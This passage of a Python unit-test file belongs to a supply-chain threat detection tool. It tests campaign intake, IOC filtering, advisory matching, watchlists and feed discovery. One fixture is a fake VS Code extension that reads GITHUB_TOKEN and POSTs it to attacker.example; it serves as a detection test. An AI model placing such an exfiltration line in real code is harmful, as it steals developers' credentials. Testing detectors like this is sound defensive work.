                "source_urls": ["https://thehackernews.com/report"],
                "actors": ["known"],
                "publishers": ["known"],
                "iocs": {"domains": ["thehackernews.com"], "operator_supplied": ["https://thehackernews.com/report"]},
                "packages": [{"ecosystem": "npm", "package": "@scope/pkg", "version": "1.2.3"}],
            },
        }
        payload = supply_chain.orchestrate_campaign_candidate(candidate)
        review = payload["orchestrator"]
        self.assertFalse(review["validated_packages"])
        self.assertTrue(review["rejected_package_candidates"])
        self.assertTrue(review["rejected_actors"])
        self.assertTrue(review["rejected_iocs"])
        self.assertEqual(payload["campaign"]["iocs"], {})

    def test_campaign_orchestrator_routes_cve_repo_context_to_vulnerability_tracking(self):
        candidate = {
            "candidate_id": "torvalds-linux-vu-260001-linux-kernel-contains-local-privilege-e-d1df1dd372",
            "source_url": "https://kb.cert.org/vuls/id/260001",
            "campaign": {
                "campaign_id": "torvalds-linux-vu-260001-linux-kernel-contains-local-privilege-e-d1df1dd372",
                "title": "VU#260001: Linux kernel contains local privilege escalation vulnerability (Copy Fail)",
                "summary": "Local privilege escalation vulnerability with CVE-2026-31431 references and public PoC notes.",
                "source_urls": ["https://kb.cert.org/vuls/id/260001"],
                "source_names": ["CERT/CC Vulnerability Notes"],
                "iocs": {
                    "domains": ["certcc.github.io", "copy.fail", "disable-algif-aead.conf", "www.cve.org"],
                    "urls": [
                        "https://certcc.github.io/SSVC/howto/gathering_info/exploitation/#public-poc",
                        "https://copy.fail",
                        "https://copy.fail</a",
                        "https://www.cve.org/CVERecord?id=CVE-2026-31431",
                    ],
                },
                "packages": [
                    {"ecosystem": "github", "package": "torvalds/linux", "version": "unknown"},
                    {"ecosystem": "github", "package": "bytedance/vArmor", "version": "unknown"},
                ],
            },
        }
        payload = supply_chain.orchestrate_campaign_candidate(candidate)
        review = payload["orchestrator"]
        flattened_iocs = supply_chain._flatten_iocs(payload["campaign"]["iocs"])

        self.assertEqual(review["campaign_type"], "vulnerability_advisory")
        self.assertEqual(review["recommended_route"], "vulnerability_tracking")
        self.assertIn("github repositories are project context, not package artifacts", review["route_blockers"])
        self.assertEqual(review["github_repos"], ["bytedance/vArmor", "torvalds/linux"])
        self.assertFalse(flattened_iocs)
        self.assertTrue(any(row["value"] == "https://copy.fail</a" and "HTML" in row["reason"] for row in review["rejected_iocs"]))
        self.assertTrue(any(row["value"] == "www.cve.org" and "source reference" in row["reason"] for row in review["rejected_iocs"]))
        self.assertIn("https://kb.cert.org/vuls/id/260001", review["source_references"])

    def test_loaded_campaign_candidates_refresh_stale_orchestrator_routes(self):
        with tempfile.TemporaryDirectory() as temp_dir:
            path = Path(temp_dir) / "candidates.json"
            path.write_text(json.dumps({
                "candidates": [
                    {
                        "candidate_id": "stale-linux-vu",
                        "source_url": "https://kb.cert.org/vuls/id/260001",
                        "orchestrator": {"recommended_route": "campaign_research", "campaign_type": "supply_chain_package_campaign"},
                        "campaign": {
                            "campaign_id": "stale-linux-vu",
                            "title": "VU#260001: Linux kernel contains local privilege escalation vulnerability (Copy Fail)",
                            "summary": "CVE-2026-31431 reference for a vulnerability in a GitHub project.",
                            "source_urls": ["https://kb.cert.org/vuls/id/260001"],
                            "packages": [{"ecosystem": "github", "package": "torvalds/linux", "version": "unknown"}],
                            "iocs": {"domains": ["www.cve.org"]},
                        },
                    }
                ]
            }), encoding="utf-8")
            payload = supply_chain.load_campaign_candidates(path)
        review = payload["candidates"][0]["orchestrator"]
        self.assertEqual(review["recommended_route"], "vulnerability_tracking")
        self.assertEqual(review["campaign_type"], "vulnerability_advisory")

    def test_open_vsx_fixture_detects_extension_activation_and_credential_theft(self):
        payload = supply_chain.analyze_ecosystem_files(
            "open-vsx",
            {
                "package.json": json.dumps({
                    "name": "angular-console",
                    "publisher": "nrwl",
                    "version": "18.95.0",
                    "activationEvents": ["workspaceContains:**/nx.json"],
                }),
                "extension.js": (
                    "const vscode=require('vscode'); const cp=require('child_process'); "
                    "const token=process.env.GITHUB_TOKEN; "
                    "fetch('https://attacker.example/upload',{method:'POST',body:token}); "
                    "cp.spawn('python',['cat.py']);"
                ),
            },
        )
        joined = "\n".join(payload["findings"]).lower()
        self.assertIn("broad activation", joined)
        self.assertIn("credential harvesting", joined)
        self.assertIn("github dead-drop", joined)
        self.assertGreater(payload["score"], 0)

    def test_github_event_fixture_detects_token_and_mass_repo_download(self):
        payload = supply_chain.analyze_ecosystem_files(
            "github",
            {
                "audit-event.json": json.dumps({
                    "actor": "compromised-workflow",
                    "token": "GITHUB_TOKEN",
                    "action": "downloaded repositories through api.github.com/repos/org/private/zipball",
                    "detail": "orphan commit and Git Data API create blob/create tree activity observed",
                })
            },
        )
        joined = "\n".join(payload["findings"]).lower()
        self.assertIn("github token", joined)
        self.assertIn("repository enumeration", joined)
        self.assertIn("orphan commit", joined)

    def test_missed_threat_advisories_match_source_backed_versions(self):
        durabletask = supply_chain.check_advisory("pypi", "durabletask", "1.4.2")
        nx_console = supply_chain.check_advisory("open-vsx", "nrwl.angular-console", "18.95.0")
        grafana = supply_chain.check_advisory("github", "grafana/grafana", "2026-05")
        laravel_lang = supply_chain.check_advisory("packagist", "laravel-lang/lang", "14.3.7")
        self.assertTrue(durabletask["matched"])
        self.assertTrue(nx_console["matched"])
        self.assertTrue(grafana["matched"])
        self.assertTrue(laravel_lang["matched"])
        self.assertEqual(nx_console["matches"][0]["safe_versions"], ["18.100.0"])

    def test_composer_lock_usage_reports_installed_packagist_version(self):
        with tempfile.TemporaryDirectory() as temp_dir:
            lockfile = Path(temp_dir) / "composer.lock"
            lockfile.write_text(json.dumps({
                "packages": [
                    {
                        "name": "laravel-lang/lang",
                        "version": "14.3.7",
                        "source": {"url": "https://github.com/Laravel-Lang/lang.git", "reference": "malicious-sha"},
                        "dist": {"reference": "malicious-dist"},
                        "time": "2026-05-18T10:00:00Z",
                    }
                ]
            }), encoding="utf-8")
            payload = supply_chain.find_composer_lock_usage(temp_dir, "laravel-lang/lang")
        self.assertTrue(payload["present"])
        self.assertEqual(payload["matches"][0]["version"], "14.3.7")
        self.assertEqual(payload["matches"][0]["source_reference"], "malicious-sha")

    def test_laravel_lang_discovery_terms_are_supply_chain_relevant(self):
        item = {
            "title": "Laravel Lang Compromised with RCE Backdoor Across 700+ Versions",
            "summary": "Composer autoload.files backdoor and historical tag rewrite across PHP package releases.",
            "url": "https://socket.dev/blog/laravel-lang-compromise",
        }
        self.assertTrue(supply_chain._is_campaign_relevant(item))
        payload = supply_chain.campaign_intake(
            text="laravel-lang/lang Composer package tag rewrite autoload.files RCE backdoor credential stealer flipboxstudio.info",
            source_name="Source fixture",
            source_url="https://packagist.org/packages/laravel-lang/lang",
        )
        self.assertEqual(payload["orchestrator"]["recommended_route"], "campaign_research")
        self.assertNotIn("autoload.files", supply_chain._flatten_iocs(payload["campaign"]["iocs"]))

    def test_campaign_watchlist_add_and_list_uses_runtime_path(self):
        with tempfile.TemporaryDirectory() as temp_dir:
            path = Path(temp_dir) / "watchlist.json"
            supply_chain.campaign_watchlist_add(package="npm:chalk-tempalte", ioc="c2.example", path=path)
            payload = supply_chain.campaign_watchlist_list(path)
        self.assertIn("npm:chalk-tempalte", payload["packages"])
        self.assertIn("c2.example", payload["iocs"])

    def test_discover_campaigns_scores_and_dedupes_feed_items(self):
        feed = """<?xml version='1.0'?><rss><channel>
        <item><title>Malicious npm packages steal credentials</title>
        <link>https://example.com/report</link>
        <description>chalk-tempalte and axois-utils contact 87e0bbc636999b.lhr[.]life for credential theft.</description></item>
        <item><title>Malicious npm packages steal credentials</title>
        <link>https://example.com/report</link>
        <description>chalk-tempalte and axois-utils contact 87e0bbc636999b.lhr[.]life for credential theft.</description></item>
        </channel></rss>"""
        with tempfile.TemporaryDirectory() as temp_dir, \
            mock.patch.object(supply_chain, "CAMPAIGN_CANDIDATES_PATH", Path(temp_dir) / "candidates.json"), \
            mock.patch.object(supply_chain, "_load_discovery_sources", return_value=[{"name": "Unit Feed", "feed_url": "https://example.com/feed.xml", "type": "rss"}]), \
            mock.patch.object(supply_chain, "_http_text", return_value=feed), \
            mock.patch.object(supply_chain, "_cached_news_items", return_value=[]):
            payload = supply_chain.discover_campaigns(since="24h", limit=10)
        self.assertEqual(payload["total_candidates"], 1)
        self.assertGreaterEqual(payload["candidates"][0]["score"], 35)
        self.assertEqual(payload["source_status"][0]["status"], "ok")
        self.assertEqual(payload["source_status"][0]["items"], 2)

    def test_discover_campaigns_reports_source_failures_structurally(self):
        with tempfile.TemporaryDirectory() as temp_dir, \
            mock.patch.object(supply_chain, "CAMPAIGN_CANDIDATES_PATH", Path(temp_dir) / "candidates.json"), \
            mock.patch.object(supply_chain, "_load_discovery_sources", return_value=[{"name": "Broken Feed", "feed_url": "https://example.com/feed.xml", "type": "rss", "poll_frequency_hint": "hourly"}]), \
            mock.patch.object(supply_chain, "_http_text", side_effect=TimeoutError("unit timeout")), \
            mock.patch.object(supply_chain, "_cached_news_items", return_value=[]):
            payload = supply_chain.discover_campaigns(since="24h", limit=10)
        self.assertEqual(payload["total_candidates"], 0)
        self.assertEqual(payload["source_status"][0]["status"], "error")
        self.assertIn("unit timeout", payload["errors"][0]["error"])

    def test_campaign_autopilot_dry_run_does_not_persist(self):
        candidate = supply_chain.campaign_intake(
            text="Malicious npm package chalk-tempalte steals credentials from environment variables.",
            source_url="https://example.com/report",
        )
        with mock.patch.object(supply_chain, "discover_campaigns", return_value={"ok": True, "candidates": [candidate], "errors": []}):
            payload = supply_chain.campaign_autopilot(since="24h", dry_run=True, persist=False, limit=1, min_score=0)
        self.assertTrue(payload["dry_run"])
        self.assertEqual(payload["selected_candidates"], 1)
        self.assertFalse(payload["results"][0]["finding_ids"])

    def test_cli_campaign_watchlist_list_outputs_json(self):
        with tempfile.TemporaryDirectory() as temp_dir, mock.patch.object(supply_chain, "CAMPAIGN_WATCHLIST_PATH", Path(temp_dir) / "watchlist.json"):
            supply_chain.campaign_watchlist_add(package="npm:chalk-tempalte", path=supply_chain.CAMPAIGN_WATCHLIST_PATH)
            stdout = StringIO()
            with mock.patch("sys.stdout", stdout):
                exit_code = secopsai_cli.main(["--json", "supply-chain", "campaign-watchlist", "list"])
        self.assertEqual(exit_code, 0)
        self.assertIn("chalk-tempalte", stdout.getvalue())

    def test_reconcile_history_upgrades_advisory_error(self):
        with tempfile.TemporaryDirectory() as temp_dir:
            temp_path = Path(temp_dir)
            advisory_dir = temp_path / "advisories"
            advisory_dir.mkdir()
            results_path = temp_path / "results.jsonl"
            findings_dir = temp_path / "findings"
            results_path.write_text(json.dumps({
                "ecosystem": "npm",
                "package": "@scope/removed",
                "old_version": "1.0.0",
                "new_version": "1.0.1",
                "verdict": "error",
                "analysis": "",
                "report_path": None,
                "rank": None,
                "finding_id": None,
                "error": "diff generation failed",
            }) + "\n", encoding="utf-8")
            (advisory_dir / "test.json").write_text(json.dumps({
                "advisory_id": "ADV-RECONCILE",
                "title": "Reconcile advisory",
                "status": "active",
                "affected": [{"ecosystem": "npm", "package": "@scope/removed", "versions": ["1.0.1"]}],
            }), encoding="utf-8")
            old_findings_dir = os.environ.get("SECOPS_FINDINGS_DIR")
            os.environ["SECOPS_FINDINGS_DIR"] = str(findings_dir)
            try:
                with mock.patch.object(supply_chain, "ADVISORIES_DIR", advisory_dir), \
                     mock.patch.object(supply_chain, "RESULTS_PATH", results_path):
                    payload = supply_chain.reconcile_history(include_advisories=True)
                    rows = [json.loads(line) for line in results_path.read_text(encoding="utf-8").splitlines()]
            finally:
                if old_findings_dir is None:
                    os.environ.pop("SECOPS_FINDINGS_DIR", None)
                else:
                    os.environ["SECOPS_FINDINGS_DIR"] = old_findings_dir

        self.assertEqual(payload["reclassified"], 1)
        self.assertEqual(rows[0]["verdict"], "malicious")
        self.assertIn("ADV-RECONCILE", rows[0]["advisory_matches"][0]["advisory_id"])

    def test_cli_explain_verdict_resolves_stored_report(self):
        with tempfile.TemporaryDirectory() as temp_dir:
            report_path = Path(temp_dir) / "report.md"
            report_path.write_text("eval\n", encoding="utf-8")
            results = [{
                "ecosystem": "pypi",
                "package": "requests",
                "new_version": "2.32.0",
                "report_path": str(report_path),
            }]
            stdout = StringIO()
            with mock.patch.object(secopsai_cli, "load_recent_results", return_value=results), \
                 mock.patch("sys.stdout", stdout):
                exit_code = secopsai_cli.main([
                    "--json",
                    "supply-chain",
                    "explain-verdict",
                    "--ecosystem",
                    "pypi",
                    "--package",
                    "requests",
                    "--version",
                    "2.32.0",
                ])

        self.assertEqual(exit_code, 0)
        output = stdout.getvalue()
        self.assertIn('"verdict": "benign"', output)
        self.assertIn('"report_path":', output)
        self.assertIn('"matched_rules"', output)


if __name__ == "__main__":
    unittest.main()
